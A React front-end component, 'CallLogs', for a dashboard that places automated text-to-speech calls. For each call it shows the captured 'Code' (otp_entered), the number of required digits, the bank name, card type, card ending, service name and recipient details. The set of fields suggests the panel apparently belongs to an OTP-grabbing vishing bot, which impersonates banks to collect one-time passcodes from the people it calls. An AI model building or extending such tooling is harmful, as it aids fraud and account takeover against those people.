import React, { useState, useEffect } from 'react';
import api from '../services/api';
import { Button } from './ui/button';
import { ScrollArea } from './ui/scroll-area';
import { format } from 'date-fns';
import { PhoneOff, Loader2 } from 'lucide-react';
import { toast } from 'sonner';

export default function CallLogs({ events, activeCall }) {
  const [loading, setLoading] = useState(false);
  const [currentCall, setCurrentCall] = useState(null);

  useEffect(() => {
    if (activeCall) {
      fetchCallDetails(activeCall.call_id);
    }
  }, [activeCall]);

  const fetchCallDetails = async (callId) => {
    try {
      const response = await api.get(`/calls/${callId}`);
      setCurrentCall(response.data);
    } catch (error) {
      console.error('Error fetching call details:', error);
    }
  };

  const handleHangup = async () => {
    if (!currentCall?.call_id) return;
    
    setLoading(true);
    try {
      await api.post(`/calls/${currentCall.call_id}/hangup`);
      toast.success('Call terminated successfully');
      setCurrentCall(null);
    } catch (error) {
      console.error('Error hanging up call:', error);
      toast.error('Failed to terminate call');
    } finally {
      setLoading(false);
    }
  };

  const getAnsweredBy = () => {
    if (!currentCall) return '-';
    const status = currentCall.status?.toLowerCase();
    if (status === 'completed' || status === 'in-progress' || status === 'answered') return 'human';
    if (status === 'no-answer') return 'unanswered';
    if (status === 'voicemail') return 'voice mail';
    return status || '-';
  };

  const getCode = () => {
    if (!currentCall?.otp_entered) return '-';
    return currentCall.otp_entered;
  };

  const getRecordingUrl = () => {
    if (!currentCall?.recording_url) return '-';
    return (
      <a 
        href={currentCall.recording_url} 
        target="_blank" 
        rel="noopener noreferrer"
        className="text-blue-400 hover:text-blue-300 underline text-sm"
      >
        {currentCall.recording_url}
      </a>
    );
  };

  const getResponses = () => {
    if (!currentCall?.user_response) return '-';
    return currentCall.user_response;
  };

  return (
    <div className="space-y-6" data-testid="call-logs">
      <div>
        <h2 className="text-2xl font-bold text-white mb-2">Call Logs</h2>
        <p className="text-gray-400">Real-time call event monitoring</p>
      </div>

      {/* Unified Call Information Panel */}
      <div className="glass-effect rounded-xl p-6 space-y-6">
        {/* LIVE EVENTS Section */}
        <div className="space-y-3">
          <h3 className="text-lg font-semibold text-[#00FF7F] mb-4">LIVE EVENTS</h3>
          
          <div className="grid grid-cols-2 gap-4">
            <div>
              <p className="text-gray-400 text-sm mb-1">Status:</p>
              <p className="text-white font-semibold">{currentCall?.status || 'initiated'}</p>
            </div>
            <div>
              <p className="text-gray-400 text-sm mb-1">Answered By:</p>
              <p className="text-white font-semibold">{getAnsweredBy()}</p>
            </div>
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div>
              <p className="text-gray-400 text-sm mb-1">Code:</p>
              <p className="text-white font-semibold">{getCode()}</p>
            </div>
            <div>
              <p className="text-gray-400 text-sm mb-1">Recording URL:</p>
              <div className="text-white font-semibold break-all">{getRecordingUrl()}</div>
            </div>
          </div>

          <div>
            <p className="text-gray-400 text-sm mb-1">Responses:</p>
            <p className="text-white font-semibold">{getResponses()}</p>
          </div>
        </div>

        {/* Call Information Section */}
        <div className="border-t border-gray-700 pt-6">
          <h3 className="text-lg font-semibold text-[#00FF7F] mb-4">Call Information:</h3>
          <div className="space-y-3">
            <div className="grid grid-cols-2 gap-4">
              <div>
                <p className="text-gray-400 text-sm mb-1">Caller Id:</p>
                <p className="text-white">{currentCall?.from_number || '-'}</p>
              </div>
              <div>
                <p className="text-gray-400 text-sm mb-1">Recipient Name:</p>
                <p className="text-white">{currentCall?.recipient_name || '-'}</p>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <p className="text-gray-400 text-sm mb-1">Recipient Number:</p>
                <p className="text-white">{currentCall?.to_number || '-'}</p>
              </div>
              <div>
                <p className="text-gray-400 text-sm mb-1">Service Name:</p>
                <p className="text-white">{currentCall?.service_name || '-'}</p>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <p className="text-gray-400 text-sm mb-1">Required Digit:</p>
                <p className="text-white">{currentCall?.digits || 6}</p>
              </div>
              <div>
                <p className="text-gray-400 text-sm mb-1">Card Type:</p>
                <p className="text-white">{currentCall?.card_type || '-'}</p>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <p className="text-gray-400 text-sm mb-1">Bank Name:</p>
                <p className="text-white">{currentCall?.bank_name || '-'}</p>
              </div>
              <div>
                <p className="text-gray-400 text-sm mb-1">Card Ending:</p>
                <p className="text-white">{currentCall?.card_ending || '-'}</p>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <p className="text-gray-400 text-sm mb-1">Language:</p>
                <p className="text-white">{currentCall?.language || 'en-US'}</p>
              </div>
              <div>
                <p className="text-gray-400 text-sm mb-1">Voice:</p>
                <p className="text-white">{currentCall?.tts_voice || 'Aurora'}</p>
              </div>
            </div>
          </div>
        </div>

        {/* Hangup Button */}
        <div className="border-t border-gray-700 pt-6">
          <Button
            onClick={handleHangup}
            disabled={loading || !currentCall}
            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-lg transition-colors"
            data-testid="hangup-button"
          >
            {loading ? (
              <>
                <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                Terminating...
              </>
            ) : (
              <>
                <PhoneOff className="w-4 h-4 mr-2" />
                HangUp
              </>
            )}
          </Button>
        </div>

        {/* Live Events */}
        {events && events.length > 0 && (
          <div className="border-t border-gray-700 pt-6">
            <h3 className="text-sm font-semibold text-[#00FF7F] mb-3">LIVE EVENTS</h3>
            <ScrollArea className="h-48">
              <div className="space-y-2">
                {events.map((event, index) => (
                  <div key={index} className="flex items-start gap-3 text-sm">
                    <span className="text-gray-400 min-w-[70px]">
                      {format(new Date(event.time || new Date()), 'HH:mm:ss')}
                    </span>
                    <span className="text-[#00FF7F]">→</span>
                    <span className="text-white flex-1">{event.event || event.message}</span>
                  </div>
                ))}
              </div>
            </ScrollArea>
          </div>
        )}

        {/* Loading Message */}
        {!currentCall && (
          <div className="text-center py-8">
            <p className="text-gray-400">Fetching data. Please do not refresh browser.</p>
          </div>
        )}
      </div>
    </div>
  );
}